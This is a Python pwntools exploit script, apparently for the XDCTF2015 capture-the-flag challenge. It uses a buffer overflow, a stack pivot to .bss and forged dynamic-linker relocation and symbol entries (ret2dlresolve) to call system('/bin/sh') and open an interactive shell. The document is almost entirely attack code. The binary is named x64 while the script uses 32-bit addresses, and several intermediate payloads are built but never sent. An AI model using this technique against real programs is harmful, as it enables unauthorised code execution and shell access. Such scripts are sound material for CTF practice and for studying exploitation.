#coding:utf-8
from pwn import *
import pwnlib
context.log_level = 'debug'
sh = process('./parelro_x64')
elf = ELF('./parelro_x64')
offset = 112
read_plt = elf.plt['read']
write_plt = elf.plt['write']

ppp_ret = 0x08048619 # ROPgadget --binary parelro_x64 --only "pop|ret"
pop_ebp_ret = 0x0804861b # ROPgadget --binary parelro_x64 --only "pop|ret"
leave_ret = 0x08048458  # ROPgadget --binary parelro_x64 --only "leave|ret"
bss_addr = 0x0804a040 
stack_size = 0x800
base_stage = bss_addr + stack_size

sh.recvuntil("Welcome to XDCTF2015~!\n")
payload = 'a' * offset + p32(read_plt) + p32(ppp_ret) + p32(0) + p32(base_stage)+ p32(100) + p32(pop_ebp_ret) + p32(base_stage) + p32(leave_ret)

sh.sendline(payload)
cmd = "/bin/sh"
plt_0 = 0x08048380  #push got[1],jmp got[2]
index_offset = 0x20
payload_1 = "aaaa" + p32(plt_0) + p32(index_offset) + "aaaa" + p32(1) + p32(base_stage + 80) + p32(len(cmd)) + 'a' * 52 + cmd + "\x00" + 'a' * 12
rel_plt = 0x08048330
dynsym = 0x080481D8
strtab = 0x08048278
fake_write_addr = base_stage + 28
index_offset = fake_write_addr - rel_plt
fake_arg = fake_write_addr - rel_plt
aline_offset = 0x10 - ((base_stage + 36 - dynsym) % 16)
fake_sym_addr = base_stage + 36 + aline_offset
r_offset = elf.got['write']
r_info = ((((fake_sym_addr - dynsym)//16)<<8)|0x7)
fake_sym = p32(0x4c) + p32(0) + p32(0) + p32(0x12)
fake_write = p32(r_offset) + p32(r_info)
fake_write_str = 'write\x00'
r_info = 0x607
payload_2 = 'aaaa' + p32(plt_0) + p32(fake_arg) + 'aaaa' + p32(1) + p32(base_stage + 80) + p32(len(cmd)) + p32(r_offset) + p32(r_info) + 'a' * 44 + cmd + '\x00' + 'a' * 12
payload_3 = 'aaaa' + p32(plt_0) + p32(index_offset)  + p32(ppp_ret)+p32(1) + p32(base_stage + 80) + p32(len(cmd)) + fake_write + 'a' * aline_offset + fake_sym
payload_3 += flat('A' * (80-len(payload_3)) , cmd + '\x00')
payload_3 += flat('A' * (100-len(payload_3)))
fake_write_str_addr = base_stage + 36 + aline_offset + 0x10
fake_name = fake_write_str_addr - strtab
fake_sym = p32(fake_name) + p32(0) + p32(0) + p32(0x12)
payload_4 = 'aaaa' + p32(plt_0) + p32(index_offset) + p32(ppp_ret) +p32(1) + p32(base_stage + 80) + p32(len(cmd)) + fake_write + 'a' * aline_offset + fake_sym + fake_write_str
payload_4 += flat('a' *(80-len(payload_4)),cmd + '\x00')
payload_4 += flat('a' * (100-len(payload_4)))
# gdb.attach(sh)
# pause()
fake_write_str = 'system\x00'
payload_5 = 'aaaa' + p32(plt_0) + p32(index_offset) + p32(ppp_ret) +p32(base_stage + 80) + p32(0) + p32(0) + fake_write + 'a' * aline_offset + fake_sym + fake_write_str
payload_5 += flat('a' *(80-len(payload_5)),cmd + '\x00')
payload_5 += flat('a' * (100-len(payload_5)))
sh.sendline(payload_5)
sh.interactive()